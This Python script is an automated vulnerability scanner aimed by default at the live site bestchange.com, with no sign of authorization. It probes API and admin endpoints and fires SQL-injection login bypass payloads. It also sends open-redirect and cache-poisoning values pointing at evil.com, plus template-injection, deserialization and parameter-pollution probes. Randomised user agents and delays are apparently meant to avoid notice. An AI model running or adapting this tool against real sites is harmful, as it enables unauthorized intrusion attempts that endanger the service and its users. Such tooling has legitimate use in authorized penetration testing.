#!/usr/bin/env python3
"""
BestChange.com Specialized Security Tests
Focused testing on specific attack vectors and business logic
"""

import requests
import time
import random
import re
import json
from urllib.parse import quote, urlparse, parse_qs
from datetime import datetime

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    RESET = '\033[0m'

class SpecializedTests:
    def __init__(self, base_url="https://www.bestchange.com"):
        self.base_url = base_url
        self.session = requests.Session()
        self.vulnerabilities = []
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        ]
        self.setup_session()
    
    def setup_session(self):
        self.session.headers.update({
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
        })
        self.session.timeout = 10
    
    def random_delay(self, min_sec=0.2, max_sec=1.0):
        time.sleep(random.uniform(min_sec, max_sec))
    
    def log_finding(self, vuln_type, location, details, severity="MEDIUM"):
        finding = {
            'type': vuln_type,
            'location': location,
            'details': details,
            'severity': severity,
            'timestamp': datetime.now().isoformat()
        }
        self.vulnerabilities.append(finding)
        color = Colors.RED if severity == "HIGH" else Colors.YELLOW if severity == "MEDIUM" else Colors.CYAN
        print(f"{color}[!] {vuln_type} [{severity}]{Colors.RESET}")
        print(f"    Location: {location}")
        print(f"    Details: {details}\n")
    
    def test_api_discovery(self):
        """Discover and test API endpoints"""
        print(f"{Colors.BLUE}[*] Discovering API endpoints...{Colors.RESET}")
        
        api_paths = [
            '/api', '/api/v1', '/api/v2', '/api/rates', '/api/exchange',
            '/rest', '/rest/api', '/graphql', '/v1', '/v2',
            '/ajax', '/ajax.php', '/api.php', '/json', '/json.php',
        ]
        
        for path in api_paths:
            try:
                url = f"{self.base_url}{path}"
                response = self.session.get(url, timeout=5)
                self.random_delay()
                
                if response.status_code in [200, 401, 403]:
                    content_type = response.headers.get('Content-Type', '')
                    if 'json' in content_type.lower() or response.text.strip().startswith('{') or response.text.strip().startswith('['):
                        self.log_finding(
                            "API Endpoint Discovered",
                            url,
                            f"Status: {response.status_code}, Content-Type: {content_type}",
                            "INFO"
                        )
                        
                        # Try to test the API
                        if response.status_code == 200:
                            try:
                                data = response.json()
                                self.log_finding(
                                    "API Information Disclosure",
                                    url,
                                    f"API returns data: {str(data)[:200]}",
                                    "MEDIUM"
                                )
                            except:
                                pass
            except:
                continue
    
    def test_click_tracking_manipulation(self):
        """Test click.php for business logic flaws"""
        print(f"{Colors.BLUE}[*] Testing click tracking manipulation...{Colors.RESET}")
        
        # Test various ID manipulations
        test_cases = [
            {'id': -1, 'from': 10, 'to': 58, 'city': 0},
            {'id': 0, 'from': 10, 'to': 58, 'city': 0},
            {'id': 999999, 'from': 10, 'to': 58, 'city': 0},
            {'id': '1', 'from': -1, 'to': 58, 'city': 0},
            {'id': '1', 'from': 10, 'to': -1, 'city': 0},
            {'id': '1', 'from': 10, 'to': 58, 'city': -1},
            {'id': 'admin', 'from': 10, 'to': 58, 'city': 0},
            {'id': '../', 'from': 10, 'to': 58, 'city': 0},
        ]
        
        for test_case in test_cases:
            try:
                url = f"{self.base_url}/click.php"
                response = self.session.get(url, params=test_case, timeout=5)
                self.random_delay()
                
                # Check for error messages that reveal information
                error_patterns = [
                    r'exchanger.*not.*found',
                    r'invalid.*id',
                    r'currency.*not.*found',
                    r'database.*error',
                ]
                
                for pattern in error_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        self.log_finding(
                            "Information Disclosure via Error",
                            "click.php",
                            f"Error message reveals info: {pattern}",
                            "MEDIUM"
                        )
                        break
            except:
                continue
    
    def test_rate_manipulation(self):
        """Test if exchange rates can be manipulated"""
        print(f"{Colors.BLUE}[*] Testing rate manipulation...{Colors.RESET}")
        
        # Try to access rate endpoints with manipulated parameters
        rate_endpoints = [
            f"{self.base_url}/index.php?mt=rates",
            f"{self.base_url}/index.php?mt=stats",
        ]
        
        for endpoint in rate_endpoints:
            try:
                # Test with negative values
                test_params = {'from': -1, 'to': -1}
                response = self.session.get(endpoint, params=test_params, timeout=5)
                self.random_delay()
                
                # Check if rates are affected
                if 'rate' in response.text.lower() or 'exchange' in response.text.lower():
                    # Try to see if we can manipulate displayed rates
                    if len(response.text) > 1000:  # Meaningful response
                        self.log_finding(
                            "Potential Rate Manipulation",
                            endpoint,
                            "Rate endpoint accepts negative parameters",
                            "MEDIUM"
                        )
            except:
                continue
    
    def test_authentication_bypass(self):
        """Test for authentication bypass attempts"""
        print(f"{Colors.BLUE}[*] Testing authentication bypass...{Colors.RESET}")
        
        # Look for admin/login endpoints
        auth_endpoints = [
            '/admin', '/admin.php', '/login', '/login.php',
            '/admin/login', '/administrator', '/panel', '/dashboard',
        ]
        
        for endpoint in auth_endpoints:
            try:
                url = f"{self.base_url}{endpoint}"
                response = self.session.get(url, timeout=5)
                self.random_delay()
                
                if response.status_code == 200:
                    # Check if it's a login page
                    if 'login' in response.text.lower() or 'password' in response.text.lower() or 'username' in response.text.lower():
                        self.log_finding(
                            "Authentication Endpoint Found",
                            url,
                            "Login page accessible",
                            "INFO"
                        )
                        
                        # Try common bypass attempts
                        bypass_payloads = [
                            {'username': "admin'--", 'password': 'test'},
                            {'username': "admin' OR '1'='1", 'password': 'test'},
                            {'username': 'admin', 'password': "admin'--"},
                        ]
                        
                        for payload in bypass_payloads:
                            try:
                                post_response = self.session.post(url, data=payload, timeout=5)
                                if 'dashboard' in post_response.text.lower() or 'welcome' in post_response.text.lower() or post_response.status_code == 302:
                                    self.log_finding(
                                        "Potential Authentication Bypass",
                                        url,
                                        f"Bypass attempt: {payload}",
                                        "HIGH"
                                    )
                            except:
                                continue
            except:
                continue
    
    def test_race_condition(self):
        """Test for race condition vulnerabilities"""
        print(f"{Colors.BLUE}[*] Testing for race conditions...{Colors.RESET}")
        
        # Test concurrent requests to same endpoint
        import threading
        
        results = []
        
        def make_request():
            try:
                url = f"{self.base_url}/click.php"
                params = {'id': 1, 'from': 10, 'to': 58, 'city': 0}
                response = self.session.get(url, params=params, timeout=5)
                results.append(response.status_code)
            except:
                pass
        
        # Send 10 concurrent requests
        threads = []
        for i in range(10):
            t = threading.Thread(target=make_request)
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
        
        # Check for inconsistent responses
        if len(set(results)) > 1:
            self.log_finding(
                "Potential Race Condition",
                "click.php",
                f"Inconsistent responses: {set(results)}",
                "MEDIUM"
            )
    
    def test_open_redirect(self):
        """Test for open redirect vulnerabilities"""
        print(f"{Colors.BLUE}[*] Testing open redirect...{Colors.RESET}")
        
        redirect_payloads = [
            'http://evil.com',
            'https://evil.com',
            '//evil.com',
            'javascript:alert(1)',
            'http://127.0.0.1',
            '%2f%2fevil.com',
            'http://evil.com@bestchange.com',
        ]
        
        redirect_params = ['redirect', 'url', 'link', 'goto', 'return', 'return_url', 'next', 'target']
        
        for param in redirect_params:
            for payload in redirect_payloads:
                try:
                    url = f"{self.base_url}/index.php"
                    response = self.session.get(url, params={param: payload}, allow_redirects=False, timeout=5)
                    self.random_delay()
                    
                    if response.status_code in [301, 302, 303, 307, 308]:
                        location = response.headers.get('Location', '')
                        if 'evil.com' in location or payload in location:
                            self.log_finding(
                                "Open Redirect",
                                f"index.php?{param}",
                                f"Redirects to: {location}",
                                "MEDIUM"
                            )
                except:
                    continue
    
    def test_parameter_pollution(self):
        """Test HTTP Parameter Pollution"""
        print(f"{Colors.BLUE}[*] Testing HTTP Parameter Pollution...{Colors.RESET}")
        
        # Test duplicate parameters
        test_cases = [
            {'id': ['1', '2']},
            {'from': ['10', '20']},
            {'to': ['58', '59']},
        ]
        
        for test_case in test_cases:
            try:
                url = f"{self.base_url}/click.php"
                # Create URL with duplicate parameters
                param_name = list(test_case.keys())[0]
                param_values = test_case[param_name]
                
                # Build URL manually with duplicate params
                test_url = f"{url}?{param_name}={param_values[0]}&{param_name}={param_values[1]}&from=10&to=58&city=0"
                response = self.session.get(test_url, timeout=5)
                self.random_delay()
                
                # Check if both values are processed
                if str(param_values[0]) in response.text and str(param_values[1]) in response.text:
                    self.log_finding(
                        "HTTP Parameter Pollution",
                        "click.php",
                        f"Multiple values for {param_name} processed",
                        "MEDIUM"
                    )
            except:
                continue
    
    def test_json_injection(self):
        """Test for JSON injection vulnerabilities"""
        print(f"{Colors.BLUE}[*] Testing JSON injection...{Colors.RESET}")
        
        # Test JSON endpoints
        json_endpoints = [
            f"{self.base_url}/images/tableau.json",
        ]
        
        json_payloads = [
            '{"test": "value"}',
            '{"test": "value", "injected": true}',
            '{"__proto__": {"isAdmin": true}}',
        ]
        
        for endpoint in json_endpoints:
            for payload in json_payloads:
                try:
                    headers = {'Content-Type': 'application/json'}
                    response = self.session.post(endpoint, json=json.loads(payload), headers=headers, timeout=5)
                    self.random_delay()
                    
                    # Check if payload is reflected
                    if payload in response.text or 'injected' in response.text.lower():
                        self.log_finding(
                            "JSON Injection",
                            endpoint,
                            f"Payload reflected: {payload}",
                            "MEDIUM"
                        )
                except:
                    continue
    
    def test_template_injection(self):
        """Test for template injection vulnerabilities"""
        print(f"{Colors.BLUE}[*] Testing template injection...{Colors.RESET}")
        
        template_payloads = [
            '{{7*7}}',
            '${7*7}',
            '#{7*7}',
            '<%=7*7%>',
            '${@print(md5(31337))}',
        ]
        
        test_params = ['template', 'view', 'page', 'file', 'include']
        
        for param in test_params:
            for payload in template_payloads:
                try:
                    url = f"{self.base_url}/index.php"
                    response = self.session.get(url, params={param: payload}, timeout=5)
                    self.random_delay()
                    
                    # Check if calculation is executed
                    if '49' in response.text or '31337' in response.text:
                        self.log_finding(
                            "Template Injection",
                            f"index.php?{param}",
                            f"Template executed: {payload}",
                            "HIGH"
                        )
                except:
                    continue
    
    def test_cache_poisoning(self):
        """Test for cache poisoning vulnerabilities"""
        print(f"{Colors.BLUE}[*] Testing cache poisoning...{Colors.RESET}")
        
        # Test cache-related headers
        cache_headers = {
            'X-Forwarded-Host': 'evil.com',
            'X-Host': 'evil.com',
            'X-Forwarded-Server': 'evil.com',
        }
        
        for header_name, header_value in cache_headers.items():
            try:
                headers = {header_name: header_value}
                response = self.session.get(f"{self.base_url}/", headers=headers, timeout=5)
                self.random_delay()
                
                # Check if header value is reflected
                if header_value in response.text:
                    self.log_finding(
                        "Potential Cache Poisoning",
                        "HTTP Headers",
                        f"{header_name} reflected in response",
                        "MEDIUM"
                    )
            except:
                continue
    
    def test_insecure_deserialization(self):
        """Test for insecure deserialization"""
        print(f"{Colors.BLUE}[*] Testing insecure deserialization...{Colors.RESET}")
        
        # PHP serialized payloads
        php_payloads = [
            'O:8:"stdClass":1:{s:4:"test";s:4:"data";}',
            'a:1:{s:4:"test";s:4:"data";}',
        ]
        
        # Python pickle (unlikely but test)
        import pickle
        import base64
        try:
            pickled = pickle.dumps({"test": "data"})
            pickled_b64 = base64.b64encode(pickled).decode()
            php_payloads.append(pickled_b64)
        except:
            pass
        
        deserialize_params = ['data', 'object', 'serialized', 'payload']
        
        for param in deserialize_params:
            for payload in php_payloads[:2]:
                try:
                    url = f"{self.base_url}/index.php"
                    response = self.session.post(url, data={param: payload}, timeout=5)
                    self.random_delay()
                    
                    # Check for deserialization errors
                    if 'unserialize' in response.text.lower() or 'deserialize' in response.text.lower():
                        self.log_finding(
                            "Potential Insecure Deserialization",
                            f"index.php?{param}",
                            "Deserialization detected",
                            "HIGH"
                        )
                except:
                    continue
    
    def generate_report(self):
        """Generate report"""
        print(f"\n{Colors.YELLOW}{'='*70}{Colors.RESET}")
        print(f"{Colors.YELLOW}SPECIALIZED TESTS REPORT{Colors.RESET}")
        print(f"{Colors.YELLOW}{'='*70}{Colors.RESET}\n")
        
        if not self.vulnerabilities:
            print(f"{Colors.GREEN}[+] No additional vulnerabilities found{Colors.RESET}")
        else:
            high = [v for v in self.vulnerabilities if v['severity'] == 'HIGH']
            medium = [v for v in self.vulnerabilities if v['severity'] == 'MEDIUM']
            info = [v for v in self.vulnerabilities if v['severity'] == 'INFO']
            
            print(f"{Colors.RED}[!] Found {len(self.vulnerabilities)} finding(s){Colors.RESET}")
            print(f"  HIGH: {len(high)}, MEDIUM: {len(medium)}, INFO: {len(info)}\n")
            
            for vuln in self.vulnerabilities:
                color = Colors.RED if vuln['severity'] == 'HIGH' else Colors.YELLOW if vuln['severity'] == 'MEDIUM' else Colors.CYAN
                print(f"{color}[{vuln['severity']}] {vuln['type']}{Colors.RESET}")
                print(f"    {vuln['location']}: {vuln['details']}\n")

def main():
    print(f"{Colors.BLUE}{'='*70}{Colors.RESET}")
    print(f"{Colors.BLUE}BestChange.com Specialized Security Tests{Colors.RESET}")
    print(f"{Colors.BLUE}{'='*70}{Colors.RESET}\n")
    
    tester = SpecializedTests()
    
    try:
        tester.test_api_discovery()
        tester.test_click_tracking_manipulation()
        tester.test_rate_manipulation()
        tester.test_authentication_bypass()
        tester.test_race_condition()
        tester.test_open_redirect()
        tester.test_parameter_pollution()
        tester.test_json_injection()
        tester.test_template_injection()
        tester.test_cache_poisoning()
        tester.test_insecure_deserialization()
    except Exception as e:
        print(f"{Colors.RED}Error: {str(e)}{Colors.RESET}")
    
    tester.generate_report()

if __name__ == "__main__":
    main()
